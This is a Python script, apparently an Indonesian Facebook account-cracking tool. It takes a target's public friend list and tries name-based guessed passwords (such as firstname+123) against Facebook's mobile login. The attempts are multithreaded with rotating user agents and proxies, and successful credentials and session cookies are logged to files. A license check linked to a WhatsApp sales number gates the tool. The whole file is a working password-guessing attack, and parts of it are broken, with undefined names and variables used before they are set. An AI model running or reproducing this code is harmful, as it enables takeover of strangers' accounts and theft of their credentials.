# 5-26-2023

import bs4,requests,os,json,time,sys,random,re,datetime,string,subprocess
import zlib,base64,pip,urllib
from rich.markdown import Markdown as mark
from bs4 import BeautifulSoup as sop
from rich import pretty
from rich import print as cetak
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console as sol
from rich.console import Console
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	exit(e)


ugen=[]
ugen2=[]


CON=sol()
pretty.install()
ses=requests.Session()
ugen=[]
ugen2=[]
tokenku=[]
#2
id=[]
id2=[]
uid=[]
#3
anyr=[]
uadia, uadarimu = [],[]
pik=[]
met=[]
ua = []
UserAgent = []
#4
loop=0
ok=0
cp=0
pwl = []
#5
uakw = []
uakn = []
pwk = []
akun = []

bt = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = bt[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okx = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpx = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


def logo():
	cetak(Panel(f"""\t[bold blue]
      __  ___           __         ______                __                __  
     /  |/  /___ ______/ /__      / ____/___ _________  / /_  ____  ____  / /__
    / /|_/ / __ `/ ___/ //_/_____/ /_  / __ `/ ___/ _ \/ __ \/ __ \/ __ \/ //_/
   / /  / / /_/ / /  / ,< /_____/ __/ / /_/ / /__/  __/ /_/ / /_/ / /_/ / ,<   
  /_/  /_/\__,_/_/  /_/|_|     /_/    \__,_/\___/\___/_.___/\____/\____/_/|_|

[bold magenta]
────────────────────────────╮
                            │
                            │
                            │
                            │
                            │
                            │
────────────────────────────╯                                                                   
 """,width=(90),height=(20),style=f"bold magenta"))


BP = '\x1b[1;105m' # BELAKANG PInk
P = '\x1b[1;97m'
K = '\033[93m' # KUNING 
H = '\x1b[1;92m' # HIJAU 
xx = '\33[m'
G = '\033[35m' # MAGENTA



def back():
	login()


for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


for tt in range(10000):
	v = random.choice(['5','6.0.1','7','8','9','10','11','12'])
	a = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	b = random.randrange(1, 999)
	c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	a1 = random.randrange(73,100)
	b2 = random.randrange(4200,4900)
	c3 = random.randrange(40,150)
	u1 = f'Mozilla/5.0 (Linux; Android {v}; Facebook) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{a1}.0.{b2}.{c3} Mobile Safari/537.36'
	u2 = f'Mozilla/3.0 (Linux; android {v}, Infinix 8XBuild SQ65.95728.023;wv) AppleWebKit/547.35 (KHTML, Like Gecko) Version/2.0 Chrome/{a1}.{b2}.{c3} Mobile Safari/722.11'
	u3 = f'Mozilla/99999 (Linux; Android 99999999999+; Ball-Tzy) AppleWebKit/999.999 (KHTML, like Gecko) Chrome/111.222.333.9999 Mobile Safari/999.999'
	u4 = f'Mozilla/5.0 (Linux; Android {v}; SAMSUNG SM-G973F Build/PPR1.180610.011){a}{b}{c}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.0 Chrome/{a1}.0.{b2}.{c3} Mobile Safari/537.36'
	u5 = f'Mozilla/5.0 (Linux; Android {v}; CMA-LX1 Build/HONORCMA-L41CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{a1}.0.{b2}.{c3} Mobile Safari/537.36'
	u6 = f'Mozilla/5.0 (Linux; U; Android {v}; sk-sk; Redmi 7A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{a1}.0.{b2}.{c3} Mobile Safari/537.36'
	uaku2 = random.choice([u1, u2, u3, u4, u5, u6])
	ugen.append(uaku2)


for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-BMobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cook.txt','r').read()
		tokenku.append(token)
		try:
			ho = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			to = json.loads(ho.text)['name']
			ko = json.loads(ho.text)['id']
			masuk(to,ko)
		except KeyError:
			login_jon()
		except requests.exceptions.ConnectionError:
			print(f' {G}[{P}!{G}] {P}internet bermasalah ')
			exit()
	except IOError:
		login_jon()


def login_jon():
	try:
		os.system('clear')
		logo()
		your_cookies = input(f'{P}—> Input Cookie : {G}')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"{P}—>  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{P}—> Token : \x1b[1;92m{access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cook.txt","w").write(your_cookies)
							print(f"\n {G}✓ {P}Login Berhasil Jalankan Lagi, python gas.py ");exit()
			except Exception as e:
				print(f'\n{P}|—× Cookie Mokad')
				os.system('rm -rf .token.txt && rm -rf .cook.txt')
				print(e)
				time.sleep(2)
				back()
	except:pass


def masuk(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cook.txt','r').read()
	except IOError:
		print(f' {G}[{P}!{G}] {P}Cookie Kadaluarsa ')
		time.sleep(3)
		login_jon()
	os.system('clear')
	time.sleep(4)
	cetak(Panel(f"""\t[bold blue]
      __  ___           __         ______                __                __  
     /  |/  /___ ______/ /__      / ____/___ _________  / /_  ____  ____  / /__
    / /|_/ / __ `/ ___/ //_/_____/ /_  / __ `/ ___/ _ \/ __ \/ __ \/ __ \/ //_/
   / /  / / /_/ / /  / ,< /_____/ __/ / /_/ / /__/  __/ /_/ / /_/ / /_/ / ,<   
  /_/  /_/\__,_/_/  /_/|_|     /_/    \__,_/\___/\___/_.___/\____/\____/_/|_|

[bold magenta]
────────────────────────────╮
[bold white]nama [bold blue]{my_name}             [bold magenta]│
[bold white]ID [bold blue]{my_id}          [bold magenta]│
                            │
                            │
                            │
                            │
────────────────────────────╯                                                                   
 """,width=(90),height=(20),style=f"bold magenta"))
	print('')
	print(f' {G}({P}01{G}){P} Crack Publik {G}✓ ')
	ges=input(f' └─{G}[{P}?{G}] {P}pilih : {G}')
	if ges in ['1','01']:
		publikk()
	else:
		print(f' {G}[{P}!{G}] {P}Pilih yg benerr ')
		exit()



def bukan():
	os.system('clear')
	print('')
	print(f""" {G}({P}01{G}) {P}Masukan Lesensi
 {G}({P}02{G}) {P}Beli Lesensi
 {G}({P}03{G}) {P}exit """)
	print('')
	inpo = input(f'{P} └─ pilih : {G}')
	if inpo in ['1','01']:
		bolt()
	elif inpo in ['2','02']:
		os.system('xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+dong');exit()
	elif inpo in ['3','03']:
		print(f' {xx}[!] exit ');exit()
	else:
		print(f' {xx}pilih yang benar ');exit()
	
def bolt():
		os.system('clear')
		print('')
		beot = input(f' {P}Lesensi : {G}')
		if beot =="":
			print(f' {xx}masukan dengan benar ');exit()
			os.system('clear')
		time.sleep(3)
		print(f'\n {xx}sedang mengecek\n')
		time.sleep(4)
		if beot not in ('rongmngg','seulnnn','seaunnnng',"slmaaanyw"):
			print(f' {xx}Lesensi salah ');exit()
			os.system('clear')
		else:
			print(f' {xx}selamat lesensi betul ');login()



def publikk():
	try:
		cok = open('.cook.txt','r').read()
	except IOError:
		os.system('rm -rf .token.txt && rm -rf .cook.txt')
		print(f' {G}[{P}!{G}] {P}Cookie Kadaluarsa')
		exit()
	idny = input(f' {G}[{P}?{G}] {P}Input ID : {G}')
	try:
		meid = requests.get('https://graph.facebook.com/v1.0/'+idny+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for balsem in meid['friends']['data']:
			try:id.append(balsem['id']+'|'+balsem['name'])
			except:continue
		print(f'{G}[{P}!{G}] {P}Total ID : {G}'+str(len(id)))
		aturt()
	except requests.exceptions.ConnectionError:
		print(f' {G}[{P}?{G}] {P}cek, internet anda bermasalah')
		exit()
	except (KeyError,IOError):
		print(f' {G}[{P}!{G}] {P}ID Tidak Publik ')
		time.sleep(3)
		publikk()



def aturt():
	print('')
	print(f' {G}({P}01{G}) {P}Random')
	print('')
	tyt = input(f'└─{G}[{P}?{G}] {P}pilih : {G}')
	if tyt in ['1','01']:
		for cak in id:
			pik = random.randint(0,len(id2))
			id2.insert(pik,cak)
	else:
		print(f' {G}[{P}!{G}] {P}pilih yang benar ')
		exit()
	
	
	print('')
	print(f' {G}({P}01{G}) {P}As ')
	print('')
	bel = input(f'└─{G}[{P}?{G}] {P}pilih : {G}')
	if bel in ['1','01']:
		met.append('mo')
	#elif bel in ['2','02']:
		#met.append('mov')
	else:
		met.append('mo')
	
	pasw()

pwpluss=[]
pwnya=[]


def pasw():
	print('')
	with tred(max_workers=30) as sik:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mo' in met:
				sik.submit(crackm,idf,pwv)
			#elif 'mov' in met:
				#sik.submit(crackv,idf,pwv)
			else:
				sik.submit(crackm,idf,pwv)
	print('')
	print(f' {P}Total OK {G}%s '%(ok))
	print(f' {P}Total CP {G}%s {P}'%(cp))
	print('')
	time.sleep(3)
	exit()
#--------------------[ METODE-B-API ]-----------------#
def crackm(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{P} {loop}/{len(id)} Ok:{ok} Cp:{cp} {'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in uakw: ua = uakn[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└──{K}{idf}|{pw}{xx}')     
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└──{H}{idf}|{pw}|{kuki}{xx}')
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crackv(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{P} ({idf}) {loop}/{len(id)} Ok:{ok} Cp:{cp} {'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in uakw: ua = uakn[0]
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└──{K}{idf}|{pw}{xx}')     
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└──{H}{idf}|{pw}|{kuki}{xx}')
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	bukan()
	login()
